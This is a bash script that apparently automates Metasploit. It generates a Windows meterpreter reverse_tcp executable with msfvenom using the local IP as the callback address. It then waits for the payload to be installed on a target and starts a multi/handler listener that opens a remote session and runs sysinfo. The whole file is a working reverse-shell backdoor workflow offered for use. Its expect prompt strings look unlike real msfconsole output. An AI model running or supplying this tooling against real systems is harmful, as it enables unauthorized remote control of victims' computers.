#!/bin/bash

name="prog.exe"
msfcons="msfconsole"
use_mh="use multi/handler"
ip_address=$(hostname -I)
create_exe="msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip_address -f exe -o $name"
set_pay="set payload windows/meterpreter/reverse_tcp"
set_ip="set LHOST $ip_address"
view_options="show options"
run="exploit"
inf="sysinfo"

echo -n "Automated Payload Generation with Bash\n"

expect -c "
spawn $msfcons
expect \"Creando: \"
send \"$create_exe\r\"
expect \"Use: \"
expect eof
"
clear

echo -n "Press any key when payload is installed\n"
read -r  key

expect -c "
spawn $msfcons
expect \"Use: \"
send \"$use_mh\r\"
expect \"set pay: \"
send \"$set_pay\r\"
expect \"set ip: \"
send \"$set_ip\r\"
expect \"view: \"
send \"$view_options\r\"
expect \"run: \"
send \"$run\r\"
expect \"inf: \"
send \"$inf\r\"
expect \"inf: \"
send \"$inf\r\"
expect eof
"
 
echo "Exit."
